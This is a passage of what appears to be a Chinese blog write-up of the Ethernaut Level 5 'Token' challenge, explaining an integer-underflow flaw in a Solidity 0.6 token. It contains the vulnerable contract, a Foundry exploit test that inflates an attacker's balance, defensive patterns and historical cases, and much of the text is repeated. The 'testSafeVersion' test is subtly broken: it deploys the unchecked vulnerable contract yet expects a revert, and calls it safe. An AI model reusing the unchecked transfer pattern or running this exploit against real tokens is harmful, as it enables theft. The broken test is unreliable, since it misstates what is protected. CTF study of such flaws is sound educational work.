console.log(&quot;=== 攻击前状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 关键攻击：转账超过余额的代币</span><br><span class=\"line\">        uint256 transferAmount = 21; // 大于 20 的余额</span><br><span class=\"line\">        token.transfer(victim, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 攻击后状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证下溢攻击成功</span><br><span class=\"line\">        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币</span><br><span class=\"line\">        assertEq(token.balanceOf(victim), transferAmount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderflowMath() public view &#123;</span><br><span class=\"line\">        // 演示下溢计算</span><br><span class=\"line\">        uint256 balance = 20;</span><br><span class=\"line\">        uint256 transferAmount = 21;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 下溢计算演示 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;原始余额:&quot;, balance);</span><br><span class=\"line\">        console.log(&quot;转账金额:&quot;, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            uint256 result = balance - transferAmount;</span><br><span class=\"line\">            console.log(&quot;下溢结果:&quot;, result);</span><br><span class=\"line\">            console.log(&quot;最大 uint256:&quot;, type(uint256).max);</span><br><span class=\"line\">            console.log(&quot;是否相等:&quot;, result == type(uint256).max);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testSafeVersion() public &#123;</span><br><span class=\"line\">        // 演示安全版本</span><br><span class=\"line\">        VulnerableToken safeToken = new VulnerableToken(1000);</span><br><span class=\"line\">        safeToken.transfer(attacker, 20);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 在 Solidity 0.8.0+ 中，这会 revert</span><br><span class=\"line\">        vm.expectRevert(); // 期望交易失败</span><br><span class=\"line\">        safeToken.transfer(victim, 21); // 这在新版本中会失败</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract TokenTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Solidity-0-8-0\"><a href=\"#1-使用-Solidity-0-8-0\" class=\"headerlink\" title=\"1. 使用 Solidity 0.8.0+\"></a>1. 使用 Solidity 0.8.0+</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        // Solidity 0.8.0+ 自动检查溢出</span><br><span class=\"line\">        balances[msg.sender] -= _value; // 自动 revert 如果下溢</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-SafeMath-库-旧版本\"><a href=\"#2-使用-SafeMath-库-旧版本\" class=\"headerlink\" title=\"2. 使用 SafeMath 库 (旧版本)\"></a>2. 使用 SafeMath 库 (旧版本)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeTokenV6 &#123;</span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法</span><br><span class=\"line\">        balances[_to] = balances[_to].add(_value); // 安全加法</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-显式检查\"><a href=\"#3-显式检查\" class=\"headerlink\" title=\"3. 显式检查\"></a>3. 显式检查</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">contract ExplicitCheckToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">        </span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"📚-核心知识点\"><a href=\"#📚-核心知识点\" class=\"headerlink\" title=\"📚 核心知识点\"></a>📚 核心知识点</h2><h3 id=\"整数溢出类型\"><a href=\"#整数溢出类型\" class=\"headerlink\" title=\"整数溢出类型\"></a>整数溢出类型</h3><table>\n<thead>\n<tr>\n<th>类型</th>\n<th>描述</th>\n<th>示例</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><strong>上溢</strong></td>\n<td>超过最大值</td>\n<td><code>type(uint256).max + 1 = 0</code></td>\n</tr>\n<tr>\n<td><strong>下溢</strong></td>\n<td>低于最小值</td>\n<td><code>0 - 1 = type(uint256).max</code></td>\n</tr>\n</tbody></table>\n<h3 id=\"Solidity-版本对比\"><a href=\"#Solidity-版本对比\" class=\"headerlink\" title=\"Solidity 版本对比\"></a>Solidity 版本对比</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// Solidity 0.7.x 及以下</span><br><span class=\"line\">function unsafeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // 可能溢出，无自动检查</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// Solidity 0.8.0+</span><br><span class=\"line\">function safeAdd(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    return a + b; // 自动检查溢出，溢出时 revert</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 显式不安全操作 (0.8.0+)</span><br><span class=\"line\">function explicitUnsafe(uint a, uint b) public pure returns (uint) &#123;</span><br><span class=\"line\">    unchecked &#123;</span><br><span class=\"line\">        return a + b; // 显式跳过溢出检查</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"安全数学运算\"><a href=\"#安全数学运算\" class=\"headerlink\" title=\"安全数学运算\"></a>安全数学运算</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// ✅ 安全的余额检查</span><br><span class=\"line\">function safeTransfer(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    require(balances[msg.sender] &gt;= _value, &quot;Insufficient balance&quot;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    balances[msg.sender] -= _value;</span><br><span class=\"line\">    balances[_to] += _value;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// ✅ 使用 SafeMath (旧版本)</span><br><span class=\"line\">function safeTransferLegacy(address _to, uint256 _value) public &#123;</span><br><span class=\"line\">    balances[msg.sender] = balances[msg.sender].sub(_value);</span><br><span class=\"line\">    balances[_to] = balances[_to].add(_value);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🏛️-历史案例\"><a href=\"#🏛️-历史案例\" class=\"headerlink\" title=\"🏛️ 历史案例\"></a>🏛️ 历史案例</h2><h3 id=\"著名的整数溢出攻击\"><a href=\"#著名的整数溢出攻击\" class=\"headerlink\" title=\"著名的整数溢出攻击\"></a>著名的整数溢出攻击</h3><ol>\n<li><p><strong>PoWHCoin</strong> (2018)</p>\n<ul>\n<li>攻击者利用整数溢出获得巨额代币</li>\n<li>导致项目完全崩溃</li>\n</ul>\n</li>\n<li><p><strong>BeautyChain (BEC)</strong> (2018)</p>\n<ul>\n<li>BatchOverFlow 漏洞</li>\n<li>造成代币价值归零</li>\n</ul>\n</li>\n<li><p><strong>SMT Token</strong> (2018)</p>\n<ul>\n<li>类似的批量转账溢出漏洞</li>\n<li>交易所暂停交易</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p>Token 关卡揭示了早期 Solidity 的重要安全隐患：</p>\n<ul>\n<li>✅ <strong>整数溢出的严重后果</strong> - 可以完全破坏代币经济学</li>\n<li>✅ <strong>版本升级的重要性</strong> - Solidity 0.8.0+ 提供内置保护</li>\n<li>✅ <strong>SafeMath 的历史价值</strong> - 在旧版本中提供安全保护</li>\n<li>✅ <strong>显式检查的必要性</strong> - 总是验证关键假设</li>\n</ul>\n<p>这个看似简单的算术错误，实际上影响了无数 DeFi 项目的安全性设计。</p>\n<hr>\n<h2 id=\"🔗-相关链接\"><a href=\"#🔗-相关链接\" class=\"headerlink\" title=\"🔗 相关链接\"></a>🔗 相关链接</h2><ul>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-04-telephone/\">上一关: Level 4 - Telephone</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-level-06-delegation/\">下一关: Level 6 - Delegation</a></strong></li>\n<li><strong><a href=\"/2025/01/25/ethernaut-foundry-solutions-series/\">系列目录: Ethernaut Foundry Solutions</a></strong></li>\n<li><strong><a href=\"https://docs.openzeppelin.com/contracts/2.x/api/math\">OpenZeppelin SafeMath</a></strong></li>\n<li><strong><a href=\"https://github.com/XuHugo/Ethernaut-Foundry-Solutions\">GitHub 项目</a></strong></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-5-Token-整数下溢攻击详解\"><a href=\"#🎯-Ethernaut-Level-5-Token-整数下溢攻击详解\" class=\"headerlink\" title=\"🎯 Ethernaut Level 5: Token - 整数下溢攻击详解\"></a>🎯 Ethernaut Level 5: Token - 整数下溢攻击详解</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/5\">Ethernaut Level 5 - Token</a><br><strong>攻击类型</strong>: 整数下溢攻击<br><strong>难度</strong>: ⭐⭐⭐☆☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><ol>\n<li><strong>获得大量代币</strong> - 从初始的 20 个代币增加到大量代币</li>\n<li><strong>理解整数溢出</strong> - 掌握算术运算的安全问题</li>\n</ol>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><h3 id=\"合约源码分析\"><a href=\"#合约源码分析\" class=\"headerlink\" title=\"合约源码分析\"></a>合约源码分析</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract Token &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) public &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // 🚨 漏洞：没有检查下溢出</span><br><span class=\"line\">        require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">        balances[msg.sender] -= _value;</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"漏洞识别\"><a href=\"#漏洞识别\" class=\"headerlink\" title=\"漏洞识别\"></a>漏洞识别</h3><p><strong>整数下溢问题</strong>：</p>\n<ol>\n<li><strong>无符号整数特性</strong> - <code>uint</code> 类型不能为负数</li>\n<li><strong>下溢行为</strong> - 当 <code>0 - 1</code> 时，结果变成 <code>2^256 - 1</code></li>\n<li><strong>检查失效</strong> - <code>require(balances[msg.sender] - _value &gt;= 0)</code> 总是为真</li>\n</ol>\n<h3 id=\"攻击原理\"><a href=\"#攻击原理\" class=\"headerlink\" title=\"攻击原理\"></a>攻击原理</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 假设用户余额为 20</span><br><span class=\"line\">uint balance = 20;</span><br><span class=\"line\">uint transferAmount = 21;</span><br><span class=\"line\"></span><br><span class=\"line\">// 下溢计算：20 - 21 = 2^256 - 1 (巨大的正数)</span><br><span class=\"line\">uint result = balance - transferAmount;</span><br><span class=\"line\">// result = 115792089237316195423570985008687907853269984665640564039457584007913129639935</span><br><span class=\"line\"></span><br><span class=\"line\">// require 检查：巨大的正数 &gt;= 0，总是为真</span><br><span class=\"line\">require(result &gt;= 0); // ✅ 通过检查</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"攻击测试代码\"><a href=\"#攻击测试代码\" class=\"headerlink\" title=\"攻击测试代码\"></a>攻击测试代码</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: MIT</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 复制原始有漏洞的合约 (使用 0.6.0 版本行为)</span><br><span class=\"line\">contract VulnerableToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint) public balances;</span><br><span class=\"line\">    uint public totalSupply;</span><br><span class=\"line\"></span><br><span class=\"line\">    constructor(uint _initialSupply) &#123;</span><br><span class=\"line\">        balances[msg.sender] = totalSupply = _initialSupply;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function transfer(address _to, uint _value) public returns (bool) &#123;</span><br><span class=\"line\">        // 故意使用不安全的算术运算</span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            require(balances[msg.sender] - _value &gt;= 0);</span><br><span class=\"line\">            balances[msg.sender] -= _value;</span><br><span class=\"line\">            balances[_to] += _value;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function balanceOf(address _owner) public view returns (uint balance) &#123;</span><br><span class=\"line\">        return balances[_owner];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract TokenTest is Test &#123;</span><br><span class=\"line\">    VulnerableToken public token;</span><br><span class=\"line\">    </span><br><span class=\"line\">    address public attacker = makeAddr(&quot;attacker&quot;);</span><br><span class=\"line\">    address public victim = makeAddr(&quot;victim&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        // 部署代币合约，初始供应量 1000</span><br><span class=\"line\">        token = new VulnerableToken(1000);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 给攻击者 20 个代币</span><br><span class=\"line\">        token.transfer(attacker, 20);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testTokenUnderflowExploit() public &#123;</span><br><span class=\"line\">        console.log(&quot;=== 攻击前状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 🎯 关键攻击：转账超过余额的代币</span><br><span class=\"line\">        uint256 transferAmount = 21; // 大于 20 的余额</span><br><span class=\"line\">        token.transfer(victim, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 攻击后状态 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;攻击者余额:&quot;, token.balanceOf(attacker));</span><br><span class=\"line\">        console.log(&quot;受害者余额:&quot;, token.balanceOf(victim));</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 验证下溢攻击成功</span><br><span class=\"line\">        assertGt(token.balanceOf(attacker), 1000000); // 攻击者获得巨额代币</span><br><span class=\"line\">        assertEq(token.balanceOf(victim), transferAmount);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testUnderflowMath() public view &#123;</span><br><span class=\"line\">        // 演示下溢计算</span><br><span class=\"line\">        uint256 balance = 20;</span><br><span class=\"line\">        uint256 transferAmount = 21;</span><br><span class=\"line\">        </span><br><span class=\"line\">        console.log(&quot;=== 下溢计算演示 ===&quot;);</span><br><span class=\"line\">        console.log(&quot;原始余额:&quot;, balance);</span><br><span class=\"line\">        console.log(&quot;转账金额:&quot;, transferAmount);</span><br><span class=\"line\">        </span><br><span class=\"line\">        unchecked &#123;</span><br><span class=\"line\">            uint256 result = balance - transferAmount;</span><br><span class=\"line\">            console.log(&quot;下溢结果:&quot;, result);</span><br><span class=\"line\">            console.log(&quot;最大 uint256:&quot;, type(uint256).max);</span><br><span class=\"line\">            console.log(&quot;是否相等:&quot;, result == type(uint256).max);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function testSafeVersion() public &#123;</span><br><span class=\"line\">        // 演示安全版本</span><br><span class=\"line\">        VulnerableToken safeToken = new VulnerableToken(1000);</span><br><span class=\"line\">        safeToken.transfer(attacker, 20);</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.startPrank(attacker);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 在 Solidity 0.8.0+ 中，这会 revert</span><br><span class=\"line\">        vm.expectRevert(); // 期望交易失败</span><br><span class=\"line\">        safeToken.transfer(victim, 21); // 这在新版本中会失败</span><br><span class=\"line\">        </span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行测试\"><a href=\"#运行测试\" class=\"headerlink\" title=\"运行测试\"></a>运行测试</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">forge <span class=\"built_in\">test</span> --match-contract TokenTest -vvv</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><h3 id=\"1-使用-Solidity-0-8-0\"><a href=\"#1-使用-Solidity-0-8-0\" class=\"headerlink\" title=\"1. 使用 Solidity 0.8.0+\"></a>1. 使用 Solidity 0.8.0+</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeToken &#123;</span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        // Solidity 0.8.0+ 自动检查溢出</span><br><span class=\"line\">        balances[msg.sender] -= _value; // 自动 revert 如果下溢</span><br><span class=\"line\">        balances[_to] += _value;</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-使用-SafeMath-库-旧版本\"><a href=\"#2-使用-SafeMath-库-旧版本\" class=\"headerlink\" title=\"2. 使用 SafeMath 库 (旧版本)\"></a>2. 使用 SafeMath 库 (旧版本)</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pragma solidity ^0.6.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;@openzeppelin/contracts/math/SafeMath.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">contract SafeTokenV6 &#123;</span><br><span class=\"line\">    using SafeMath for uint256;</span><br><span class=\"line\">    </span><br><span class=\"line\">    mapping(address =&gt; uint256) public balances;</span><br><span class=\"line\">    </span><br><span class=\"line\">    function transfer(address _to, uint256 _value) public returns (bool) &#123;</span><br><span class=\"line\">        balances[msg.sender] = balances[msg.sender].sub(_value); // 安全减法</span><br><span class=\"line\">        balances[_to] = balances[_to].add(_value); // 安全加法</span><br><span class=\"line\">        return true;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-显式检查\"><a href=\"#3-显式检查\" class=\"headerlink\" title=\"3. 显式检查\"></a>3. 显式检查</h3><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 